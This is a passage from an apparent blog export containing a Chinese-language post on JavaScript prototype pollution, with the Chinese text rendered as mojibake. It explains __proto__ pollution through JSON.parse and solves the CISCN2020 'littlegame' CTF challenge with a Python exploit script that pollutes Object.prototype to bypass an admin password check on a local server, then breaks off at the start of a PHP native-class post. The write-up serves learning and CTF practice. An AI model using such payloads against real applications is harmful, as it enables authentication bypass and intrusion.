punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> o1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> o2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span><span class="token punctuation">)</span><span class="token function">merge</span><span class="token punctuation">(</span>o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o1<span class="token punctuation">.</span>a<span class="token punctuation">,</span> o1<span class="token punctuation">.</span>b<span class="token punctuation">)</span>  <span class="token comment">// 1,2</span>o3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o3<span class="token punctuation">.</span>b<span class="token punctuation">)</span>  <span class="token comment">// 2</span></code></pre><p>è¿™é‡Œä¸ºä»€ä¹ˆè¦ç”¨<code>JSON.parse</code>è€Œä¸ç›´æ¥ä½¿ç”¨<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code></p><p>å¦‚æœä¸ä½¿ç”¨<code>JSON.parse</code>ï¼Œåˆ™åŸå‹é“¾å¹¶ä¸ä¼šè¢«æ±¡æŸ“ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605195054300.png" alt loading="lazy"></p><p>å› ä¸ºæˆ‘ä»¬ç”¨JavaScriptåˆ›å»ºo2çš„è¿‡ç¨‹ï¼ˆ<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>ï¼‰ä¸­ï¼Œ<code>__proto__</code>å·²ç»ä»£è¡¨o2çš„åŸå‹äº†ï¼Œæ­¤æ—¶éå†o2çš„æ‰€æœ‰é”®åï¼Œæ‹¿åˆ°çš„æ˜¯<code>[a, b]</code>ï¼Œ<code>__proto__</code>å¹¶ä¸æ˜¯ä¸€ä¸ªkeyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹Objectçš„åŸå‹ã€‚</p><h3 id="æ —å­"><a href="#æ —å­" class="headerlink" title="æ —å­"></a>æ —å­</h3><h4 id="CISCN2020-littlegame"><a href="#CISCN2020-littlegame" class="headerlink" title="CISCN2020 littlegame"></a>CISCN2020 littlegame</h4><p>2020å¹´çš„å›½èµ›é¢˜ï¼Œå½“æ—¶ä¿å­˜äº†ä¸€ä»½é¢˜ç›®æºç ï¼Œäºæ˜¯è¿™é‡Œæ‹¿å‡ºæ¥å¤ç°ä¸€ä¸‹</p><p>index.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> setFn <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'set-value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">COMMODITY</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"sword"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Gold"</span><span class="token operator">:</span> <span class="token string">"20"</span><span class="token punctuation">,</span> <span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"50"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">// Times have changed</span>    <span class="token string">"gun"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Gold"</span><span class="token operator">:</span> <span class="token string">"100"</span><span class="token punctuation">,</span> <span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"200"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token constant">MOBS</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Lv1"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv2"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"10"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv3"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"10"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"15"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv4"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"20"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"30"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv5"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"50"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"65"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv6"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"80"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"100"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token constant">BOSS</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Times have not changed</span>    <span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"201"</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> Admin <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"password1"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>p1<span class="token punctuation">,</span>    <span class="token string">"password2"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>p2<span class="token punctuation">,</span>    <span class="token string">"password3"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>p3<span class="token punctuation">&#125;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/BuyWeapon'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// not implement</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"BOOS has said 'Times have not changed'!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/EarnBounty'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// not implement</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"BOOS has said 'Times have not changed'!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/ChallengeBOSS'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// not implement</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"BOOS has said 'Times have not changed'!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/DeveloperControlPanel"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// not implement</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>key <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"What's your problem?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> key <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>Admin<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">===</span> password<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Wrong password!Are you Admin?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/SpawnPoint'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>knight <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"HP"</span><span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>        <span class="token string">"Gold"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>        <span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token number">10</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Let's begin!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/Privilege"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Why not ask witch for help?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>knight <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/SpawnPoint'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeKey <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeValue <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"What's your problem?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> key <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeKey<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> value <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeValue<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">setFn</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>knight<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Let's have a check!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>å®¡è®¡ä»£ç ï¼Œflagåœ¨ç¯å¢ƒå˜é‡ä¸­ï¼Œéœ€è¦è®¿é—®<code>DeveloperControlPanel</code>è¿™ä¸ªè·¯ç”±ï¼Œå¹¶ä¸”éœ€è¦<code>Admin[key] === password</code>ï¼Œç®€å•æ¥è¯´æˆ‘ä»¬éœ€è¦çŸ¥é“p1ã€p2ã€p3ä¸­çš„ä»»æ„ä¸€ä¸ªå¯†ç å³å¯æ‹¿åˆ°flag</p><p>æ ¹æ®æç¤ºçœ‹åˆ°<code>Privilege</code>è·¯ç”±ï¼Œè¿™é‡Œè®¿é—®æ—¶<code>knight</code>è¿™ä¸ª<code>session</code>æ²¡å®šä¹‰ï¼Œåˆ™é‡å®šå‘åˆ°<code>SpawnPoint</code>åˆ›å»ºä¸€ä¸ªï¼Œéšåå†è®¿é—®çš„æ—¶å€™éœ€è¦æºå¸¦<code>NewAttributeKey</code>å’Œ<code>NewAttributeValue</code>ä¸¤ä¸ªå‚æ•°ï¼Œæ¥è¿›è¡Œ<code>setFn</code>æ“ä½œï¼Œå¯ä»¥çœ‹åˆ°<code>setFn</code>åœ¨å¤´éƒ¨å®šä¹‰<code>const setFn = require(&#39;set-value&#39;);</code></p><ul><li><p><a href="https://www.npmjs.com/package/set-value">set-value</a> : Set nested properties on an object using dot notation. / ä½¿ç”¨ç‚¹è¡¨ç¤ºæ³•åœ¨å¯¹è±¡ä¸Šè®¾ç½®åµŒå¥—å±æ€§ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> set <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'set-value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">'a.b.c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//=> &#123; a: &#123; b: &#123; c: 'd' &#125; &#125; &#125;</span></code></pre></li></ul><p>è·Ÿè¿›åˆ°è¿™ä¸ªåŒ…çš„æºä»£ç </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'use strict'</span><span class="token punctuation">;</span><span class="token keyword">const</span> isPlain <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'is-plain-object'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> path<span class="token punctuation">,</span> value<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isObject</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> target<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> opts <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> isArray <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isArray <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> path <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> target<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> merge <span class="token operator">=</span> opts<span class="token punctuation">.</span>merge<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>merge <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> merge <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    merge <span class="token operator">=</span> Object<span class="token punctuation">.</span>assign<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> keys <span class="token operator">=</span> isArray <span class="token operator">?</span> path <span class="token operator">:</span> <span class="token function">split</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> len <span class="token operator">=</span> keys<span class="token punctuation">.</span>length<span class="token punctuation">;</span>  <span class="token keyword">const</span> orig <span class="token operator">=</span> target<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>options <span class="token operator">&amp;&amp;</span> keys<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">result</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> merge<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> target<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> prop <span class="token operator">=</span> keys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isObject</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      target<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">result</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> prop<span class="token punctuation">,</span> value<span class="token punctuation">,</span> merge<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    target <span class="token operator">=</span> target<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> orig<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">result</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> path<span class="token punctuation">,</span> value<span class="token punctuation">,</span> merge</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>merge <span class="token operator">&amp;&amp;</span> <span class="token function">isPlain</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isPlain</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    target<span class="token punctuation">[</span>path<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> target<span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    target<span class="token punctuation">[</span>path<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ„é€ <code>NewAttributeKey</code>ä¸º<code>__proto__.extrader</code>ï¼Œ<code>NewAttributeValue</code>ä¸º<code>extrader</code></p><p><code>path</code>è¢«æ‹†åˆ†æˆ<code>[&#39;__proto__&#39;,&#39;extrader&#39;]</code>ï¼Œç¬¬ä¸€æ¬¡çš„forå¾ªç¯ï¼Œå°†<code>target = target[prop]</code>ï¼Œæ­¤æ—¶çš„<code>prop</code>å°±æ˜¯<code>__proto__</code>ï¼Œç»è¿‡ä¸€æ¬¡å¾ªç¯å<code>target</code>å°±ä¸º<code>req.session.knight.__proto__</code>äº†ï¼Œéšå<code>i === len - 1</code>åˆ¤æ–­ä¸ºæœ€åä¸€ä¸ªå€¼ï¼Œè¿›å…¥<code>result</code></p><p>ä¸»è¦çœ‹åˆ°<code>result</code>è¿™ä¸ªæ–¹æ³•ï¼Œä¼šå°†<code>value</code>èµ‹å€¼ç»™<code>target[path]</code>,å­˜åœ¨èµ‹å€¼æ“ä½œ,ä¾¿å‡ºç°äº†åŸå‹é“¾æ±¡æŸ“  </p><p>ä¼ å…¥<code>result</code>å‡½æ•°çš„<code>target</code>ä¸º<code>req.session.knight.__proto__</code>ï¼Œ<code>req.session.knight</code>çš„åŸå‹æ˜¯<code>Object</code>ï¼Œå³<code>Object.prototype</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨<code>Object</code>è¿™ä¸ªç±»ä¸­å®šä¹‰å˜é‡<code>req.session.knight.__proto__[path] = value</code>ï¼Œå³<code>Object.prototype[path] = value</code>ï¼Œé”®ä¸ºpathï¼Œå€¼ä¸ºvalueï¼Œvalueå’Œpathæˆ‘ä»¬éƒ½å¯æ§</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605181626037.png" alt loading="lazy"></p><p>Expï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1:3000/'</span>data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"NewAttributeKey"</span> <span class="token punctuation">:</span> <span class="token string">"__proto__.extrader"</span><span class="token punctuation">,</span>    <span class="token string">"NewAttributeValue"</span> <span class="token punctuation">:</span> <span class="token string">"extrader"</span><span class="token punctuation">&#125;</span>data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"key"</span> <span class="token punctuation">:</span> <span class="token string">"extrader"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span> <span class="token punctuation">:</span> <span class="token string">"extrader"</span><span class="token punctuation">&#125;</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'SpawnPoint'</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'Privilege'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'DeveloperControlPanel'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data2<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">ç»§æ‰¿ä¸åŸå‹é“¾</a></li><li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡»</a></li><li><a href="https://xz.aliyun.com/t/7182">æµ…æjavascriptåŸå‹é“¾æ±¡æŸ“æ”»å‡»</a></li><li><a href="https://www.huaweicloud.com/articles/588bbccfd343112b66fba197a74dd245.html">JSä¸­çš„prototypeã€__proto__ä¸constructor</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸå‹é“¾ </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpåŸç”Ÿç±»åˆ©ç”¨</title>
      <link href="posts/35c0085d/"/>
      <url>posts/35c0085d/</url>
      
        <content type="html"><![CDATA[<h3 id="Class-Found"><a href="#Class-Found" class="headerlink" title="Class Found"></a>Class Found</h3><p><strong>phpä¸­å«é­”æœ¯æ–¹æ³•çš„å†…ç½®ç±»</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// è¿”å›ç”±å·²å®šä¹‰ç±»çš„åå­—æ‰€ç»„æˆçš„æ•°ç»„</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// è¿”å›ç”±ç±»çš„æ–¹æ³•åç»„æˆçš„æ•°ç»„</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token 